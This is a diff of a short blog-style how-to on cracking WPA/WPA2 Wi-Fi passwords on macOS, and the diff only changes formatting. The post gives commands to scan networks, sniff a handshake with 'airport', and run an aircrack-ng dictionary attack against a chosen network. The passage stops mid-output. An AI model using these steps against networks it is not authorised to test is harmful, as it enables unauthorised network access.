@@ -6,9 +6,12 @@ category_en: wifi
 title: aircrack on mac
 tags: icmp 
 ---
-###  aircrack on mac with WPA/WPA2
+ 
+### aircrack on mac with WPA/WPA2
+
+
 * `airmon-ng` `airodump-ng` `aireplay-ng` doesn't work for mac<br>
-* use `airport` on mac to sniff authentication handshake<br>
+* use `airport` on mac to sniff authentication handshake
 * type `airport -s` on terminal, find channel of wifi which you wana crack
 <pre>
                             SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
@@ -23,7 +26,7 @@ tags: icmp
 
 </pre>
 
-* type `sudo airport en0 sniff 1` to sniff authentication handshake.<br>
+* type `sudo airport en0 sniff 1` to sniff authentication handshake.
 * download wifi crack dictionary , type `aircrack-ng -w wifi.txt authen.cap | grep 'handshake'`, find line which handshake count more than 0
 <pre>
 sunjk:wifi SunJK$ aircrack-ng -w wifi.txt a2.cap | grep 'handshake'
